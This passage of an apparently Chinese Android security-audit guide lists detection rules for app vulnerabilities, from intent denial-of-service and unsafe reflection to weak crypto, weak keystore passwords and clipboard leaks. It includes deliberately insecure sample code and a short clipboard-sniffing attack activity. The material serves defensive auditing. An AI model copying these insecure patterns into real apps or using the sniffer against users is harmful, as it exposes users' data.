&#123;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">Intent</span> <span class="variable">kkk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">if</span> (abc.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有对getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换，从而导致类型转换异常导致拒绝服务漏洞</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">a</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> (String) a.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">    <span class="comment">//针对异常进行操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小判断，导致数组访问越界而造成拒绝服务漏洞</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; intArray = intent.getIntegerArrayListExtra(<span class="string">&quot;user_id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intArray != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        intArray.get(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有找到从getSerializableExtra()获取到的序列化对象的类定义，因此导致发生类未定义的异常导致拒绝服务漏洞</span></span><br><span class="line">a.getSerializableExtra(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="manifest中定义组件为实现检测">manifest中定义组件为实现检测</h3><p>在manifest文件中定义的组件导出，且没有代码实现，则攻击者可以通过ddos攻击导致app崩溃</p><p>**风险等级：**中危</p><p><strong>问题实例：</strong></p><p>首先获取app源码中所有类的路径(包名+类名)，然后检测manifest中声明的所有组件是否存在于类路径中即可</p><p><strong>建议：</strong></p><p>删除manifest文件中无效的导出组件</p><h3 id="Debug或Test敏感测试组件泄露检测">Debug或Test敏感测试组件泄露检测</h3><p>一些app在正式发布之前，为了方便调试app，都会在app里集成一些调式或者测试界面，这些测试界面可能包含敏感信息。</p><p>**风险等级：**低危或中危</p><p><strong>问题实例</strong></p><p>遍历manifest文件中所有组件的名称，找出所有带有debug或者test等测试字样的关键字组件，并根据组件的intent-filter属性构造intent发送让组件弹出进行检测</p><p><strong>建议</strong></p><p>正式发布前移除所有测试组件</p><h3 id="Intent不安全反射风险检测">Intent不安全反射风险检测</h3><p>通过Intent接收的Extra参数来构造反射对象会导致从不受信任的源加载类，攻击者可以通过巧妙地构造达到加载其他类的目的、</p><p>**风险等级：**低危</p><p><strong>问题实例</strong></p><p>Step1：检测出导出的组件</p><p>Step2：在导出的组件下，检测两个关键函数，分别是：getIntent()和Class.forName(“…”)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecondActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_second);</span><br><span class="line"><span class="comment">//这里的intent使用了getStringExtra方法加载了一个名称为className的类</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; clz = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//尝试以反射的方式构造className的实例</span></span><br><span class="line"> clz = Class.forName(className);</span><br><span class="line"><span class="type">Date</span> <span class="variable">object</span> <span class="operator">=</span> (Date) clz.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(methodName);</span><br><span class="line">Toast.makeText(getApplicationContext(), method.invoke(object, <span class="literal">null</span>) + <span class="string">&quot;======&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向后对应的smali代码如下：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/bug/intent/reflection/SecondActivity;</span>-&gt;getIntent()<span class="class">Landroid/content/Intent;</span></span><br><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/Class;</span>-&gt;forName(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Class;</span></span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p><strong>建议：</strong></p><ul><li>不要通过Intent接收的Extra传播的反射函数</li><li>将接受反射的组件设置为非导出组件</li></ul><h2 id="WebView组件安全">WebView组件安全</h2><h2 id="SQLite安全">SQLite安全</h2><h2 id="网络通信安全">网络通信安全</h2><h3 id="SSL连接检测">SSL连接检测</h3><p>URL没有使用SSL安全协议</p><p>**风险等级：**提示</p><p>问题实例：</p><p>所有不使用https的url字符串常量</p><p><strong>建议</strong>：</p><ul><li>如果使用https协议加载url，应用进行证书校验，防止访问的页面被篡改挂马</li><li>如果使用http协议加载url，应进行白名单过滤，完整性校验等防止访问的页面被篡改</li><li>如果加载本地html，应将html文件内置在apk中，以及进行对html页面完整性的校验</li></ul><h3 id="SSL不安全组件检测">SSL不安全组件检测</h3><p>SSLCertificateSocketFactory#getInsecure方法无法执行SSL验证检查，使得网络通信遭受中间人攻击。</p><p>**风险等级：**提示</p><p><strong>问题示例：</strong></p><p>检测是否使用了SSLCertificateSocketFactory#getInsecure方法</p><p><strong>建议</strong>：</p><p>移除SSLCertificateSocketFactory#getInsecure方法</p><h3 id="HttpHost检测">HttpHost检测</h3><p><code>HttpHost target = new HttpHost(uri.getHost(), uri.getPort(), HttpHost.DEFAULT_SCHEME_NAME);</code></p><p>HttpHost.DEFAULT_SCHEME_NAME默认是http，不安全。</p><p><strong>问题示例：</strong></p><p>检测HttpHost使用的参数是否是<code>http</code></p><p><strong>建议</strong>：</p><p>改成使用<code>https</code></p><h3 id="HttpURLConnection漏洞检测">HttpURLConnection漏洞检测</h3><p>在<code>Android 2.2</code>版本之前，HttpURLConnection一直存在着一些令人厌烦的bug。比如说对一个可读的InputStream调用close()方法时，就有可能会导致连接池失效了。</p><p><strong>风险等级</strong>：<code>低危</code></p><p><strong>问题示例：</strong></p><p>判断使用HttpURLConnection是否进行了版本判断</p><p><strong>建议</strong>：</p><p>判断Android版本，并设置http.keepAlive为false。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">disableConnectionReuseIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 解决Android Froyo(Androdi 2.2)版本之前，在HTTP连接重用时会出现的BUG</span></span><br><span class="line">    <span class="keyword">if</span> (Integer.parseInt(Build.VERSION.SDK) &lt; Build.VERSION_CODES.FROYO) &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;http.keepAlive&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="网络端口开放威胁检测">网络端口开放威胁检测</h3><p>Android应用通常使用PF_UNIX，PF_INET，PF_NETLINK等不同domain的socket来进行本地IPC或者远程网络通信，这些暴露在socket代表了潜在的本地或者远程攻击面，历史上也出现过不少利用socket进行拒绝服务，root提权或者远程命令执行的案例，特别是PF_INET类型的网络socket，可以通过网络与Android应用通信，其原本用于linux环境下开放网络服务，由于缺乏对网络调用者身份或者本地调用者id，permission等细粒度的安全检查机制，在实现不当的情况下，可以突破Android沙箱限制，以被攻击应用的权限执行命令，通常出现比较严重的漏洞</p><p>**风险等级：**低危</p><p><strong>建议</strong></p><p>直接传递命令字或者间接处理有敏感信息或操作时，避免使用socket实现，使用身份认证，鉴权，参数校验等安全要素。</p><h2 id="弱加密风险检测">弱加密风险检测</h2><h3 id="DES弱加密算法风险检测">DES弱加密算法风险检测</h3><p>安全性要求高的应用程序必须避免使用不安全的或者强度弱的加密算法。例如，数据加密标准算法DES(密钥默认是56位，算法半公开，迭代次数少)是极度不安全的。</p><p>**风险等级：**低危</p><p><strong>问题示例</strong>：</p><p>使用des弱加密算法，风险代码样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;DES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过正则表达式&quot;DES/(\w){3}/.+Padding&quot;匹配字符串常量。</p><p><strong>建议：</strong></p><p>建议使用安全性更高的AES加密算法</p><h3 id="不安全的密钥长度风险检测">不安全的密钥长度风险检测</h3><p>在使用RSA加密时，加密长度小于512bit，小于512bit的密钥很容易被破解，计算出密钥</p><p>**风险等级：**低危</p><p><strong>问题示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> KeyPair <span class="title function_">getRSAKey</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">    keyGen.initialize(<span class="number">512</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKeyPair();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的smali代码如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;getInstance(Ljava<span class="regexp">/lang/</span>String;)Ljava<span class="regexp">/security/</span>KeyPairGenerator;</span><br><span class="line"></span><br><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;initialize(I)V</span><br></pre></td></tr></table></figure><p>通过匹配上述函数，并根据initialize函数的参数值判断。</p><p><strong>建议</strong>：</p><p>在使用RSA加密时，建议密钥长度大于1024bit</p><h3 id="AES-ECB弱加密风险检测">AES-ECB弱加密风险检测</h3><p>AES的ECB加密模式容易遭到字典攻击，安全性不够</p><p>**风险等级：**低危</p><p><strong>问题示例：</strong></p><p>第一步，检测以下函数：</p><ul><li>getInstance(String transformation)</li><li>getInstance(String transformation, String provider)</li><li>getInstance(String transformation, Provider provider)</li></ul><p>第二步，检测上述函数第一个参数值出现以下情况的任意一种，即可认为该检测项不安全，标记为<code>低危</code>。</p><ul><li>“AES”，Android提供的AES加密算法API默认使用ECB模式</li><li>“DES”，DES默认是56位加密密钥，已经不安全</li><li>“AES/ECB/xxx”</li><li>“DES/ECB/xxx”</li><li>“DESede/ECB/xxx”</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(keyBytes, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS7Padding&quot;</span>, <span class="string">&quot;BC&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>建议</strong></p><p>避免使用ECB模式，建议使用CBC模式</p><h3 id="IVParameterSpec不安全初始化向量检测">IVParameterSpec不安全初始化向量检测</h3><p>使用IVParameterSpec函数，如果使用了固定的初始化向量，那么密码文本可预测性高得多，容易收到字典攻击。</p><p>**风险等级：**低危</p><p><strong>问题示例：</strong></p><p>初始化向量时，使用了硬编码到程序的常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] iv = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv)</span><br></pre></td></tr></table></figure><p>匹配<code>Ljavax/crypto/spec/IvParameterSpec;-&gt;&lt;init&gt;([B)V</code>函数</p><p><strong>建议</strong></p><p>IVParameterSpec初始化时，不使用常量vector。</p><h3 id="RSA中不使用Padding风险检测">RSA中不使用Padding风险检测</h3><p>使用RSA公钥时通常会绑定一个padding，原因是为了防止一些依赖于no padding时对RSA算法的攻击</p><p>**风险等级：**低危</p><p><strong>问题示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">rsa</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    rsa = javax.crypto.Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (java.security.NoSuchAlgorithmException e) &#123;&#125;</span><br><span class="line">  <span class="keyword">catch</span> (javax.crypto.NoSuchPaddingException e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;RSA&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>用正则表达式<code>RSA/(\w)&#123;3&#125;/NoPadding</code>匹配字符串常量</p><p><strong>建议：</strong></p><p>建议使用Padding模式。</p><h3 id="KeyStore弱密码风险检测">KeyStore弱密码风险检测</h3><p>keytool是一个java数据证书的管理工具，</p><p>keytool将密钥(key，私钥和公钥配对)和证书(certificates)存在一个称为keystore的文件中，并通过密码保护keystore中的密钥。如果密码设置过于简单，例如：123456、android等，则会导致keystore文件的私钥泄露，从而导致一系列的信息泄露风险。</p><p><strong>风险等级</strong>：<code>高危</code></p><p><strong>检测方法</strong></p><p>方法一）基于keytool命令行检测：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">keytool</span> -list -keystore <span class="literal">debug</span>.keystore</span><br></pre></td></tr></table></figure><p>然后输入不安全的弱密码，若正常输出，表明该keystore文件存在弱密码风险</p><p>（方法二）基于pyjks的第三方python解析库</p><p>安装<code>pip install pyjks</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_keystore_pwd</span>(<span class="params">self, jks_file, pwd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jks.KeyStore.load(jks_file, pwd)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>然后通过常见的弱密码组合进行payload测试。</p><p><strong>建议</strong>：</p><p>提高keystore保护密码的强度。</p><h2 id="数据安全检测">数据安全检测</h2><h3 id="敏感信息检测">敏感信息检测</h3><p>通过正则表达式匹配敏感信息</p><p>我们可以通过如下的几个正则表达式，匹配邮箱地址，手机号，电话号码，身份证和qq等敏感的信息，看是否有在代码中出现，提醒开发者注意这些敏感信息，防止不必要的外泄</p><p>邮箱地址</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp5</span> <span class="operator">=</span> <span class="string">&quot;[<span class="char escape_">\w</span>.-]+@[<span class="char escape_">\w</span>-]+<span class="char escape_">\.</span>[<span class="char escape_">\w</span>.]+&quot;</span></span><br></pre></td></tr></table></figure><p>手机号</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp6 = &quot;^(<span class="number">13</span>[<span class="number">0</span>-<span class="number">9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$&quot;</span><br></pre></td></tr></table></figure><p>电话号码</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp7</span> <span class="operator">=</span> <span class="string">&quot;<span class="char escape_">\d</span>&#123;3&#125;-<span class="char escape_">\d</span>&#123;8&#125;|<span class="char escape_">\d</span>&#123;4&#125;-<span class="char escape_">\d</span>&#123;7&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>身份证号</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp8</span> <span class="operator">=</span> <span class="string">&quot;^<span class="char escape_">\d</span>&#123;15&#125;|<span class="char escape_">\d</span>&#123;18&#125;$&quot;</span></span><br></pre></td></tr></table></figure><p>QQ号</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">regexp9</span> <span class="operator">=</span> <span class="string">&quot;[1-9][0-9]&#123;4,&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="剪贴板敏感信息泄露风险检测">剪贴板敏感信息泄露风险检测</h3><p>由于Android剪贴板的内容向任何权限的app开放，很容易被嗅探泄密，同一部手机中安装的其他app，甚至是一些权限不高的app，都可以通过剪贴板功能获取剪贴板中的敏感信息</p><p>**风险等级：**提醒</p><p><strong>问题示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clipBtn = (Button) findViewById(R.id.btn_clip);</span><br><span class="line">clipBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">clipboard</span> <span class="operator">=</span> (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClipData</span> <span class="variable">clip1</span> <span class="operator">=</span> ClipData.newPlainText(<span class="string">&quot;label&quot;</span>,<span class="string">&quot;password=123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clipboard.setPrimaryClip(clip1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>漏洞可以利用如下代码利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">clipBoard</span> <span class="operator">=</span> (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">clipBoard.addPrimaryClipChangedListener( <span class="keyword">new</span> <span class="title class_">ClipboardListener</span>() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">ClipboardManager</span> <span class="variable">cm</span> <span class="operator">=</span> (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line"><span class="type">ClipData</span> <span class="variable">cd2</span> <span class="operator">=</span> cm.getPrimaryClip();</span><br><span class="line"><span class="type">String</span> <span class="variable">clipText</span> <span class="operator">=</span> cd2.getItemAt(<span class="number">0</span>).getText().toString();</span><br><span class="line"><span class="comment">//Log.v(&quot;clipboard&quot;, &quot;Attacked: &quot; + clipText);</span></span><br><span class="line">Toast.makeText(getApplicationContext(), <span class="string">&quot;Attacked: &quot;</span> + clipText, Toast.LENGTH_LONG).show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClipboardListener</span> <span class="keyword">implements</span> <span class="title class_">ClipboardManager</span>.OnPrimaryClipChangedListener &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPrimaryClipChanged</span><span class="params">()</span> &#123;</span><br><span class="line">   attack();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议：</strong></p><p>避免使用剪贴板明文存储敏感信息或进行加密。</p><h3 id="Intent敏感数据泄露风险检测">Intent敏感数据泄露风险检测</h3><p>APP创建Intent传递数据到其他Activity，如果创建的Activity不是在同一个Task中打开，就很可能被其他的Activity劫持读取到Intent内容，跨Task的Activity通过Intent传递敏感信息是不安全的。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例：</strong></p><p>检测是否使用了FLAG_ACTIVITY_NEW_TASK标志。</p><p><strong>建议：</strong></p><p>尽量避免使用包含FLAG_ACTIVITY_NEW_TASK标志的Intent来传递敏感信息。</p><h3 id="PendingIntent误用风险">PendingIntent误用风险</h3><p>使用pendingIntent时候，如果使用了一个空Intent，会导致恶意用户劫持Intent的内容。禁止使用空intent去构造pendingIntent。</p><p>风险等级：<code>中危</code></p><p>问题示例：</p><p>通过判断代码片段中有没有出现以下函数，即可知道是否使用了空intent构造PendingIntent。</p><p><img src="assets/image-20240920195326209.png" alt="image-20240920195326209"></p><p><strong>建议：</strong></p><p>禁止使用空intent去构造pendingIntent。</p><h3 id="密钥硬编码风险检测">密钥硬编码风险检测</h3><p>将密钥硬编码在Java代码、文件中，这样做会引起很大风险。<strong>信息安全的基础在于密码学，而常用的密码学算法都是公开的，加密内容的保密依靠的是密钥的保密</strong>，密钥如果泄露，对于对称密码算法，根据用到的密钥算法和加密后的密文，很容易得到加密前的明文；对于非对称密码算法或者签名算法，根据密钥和要加密的明文，很容易获得计算出签名值，从而伪造签名。</p><p>风险等级：<code>提醒</code></p><p>检测使用以下加密算法的路径，目前该检测项只检测是否在Java层有<strong>显式地</strong>保存密钥，这应该是最有风险的一种保存方式。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES<span class="regexp">/CBC/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/CBC/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/CTR/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/GCM/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>PKCS1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">1</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">224</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">256</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">384</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span 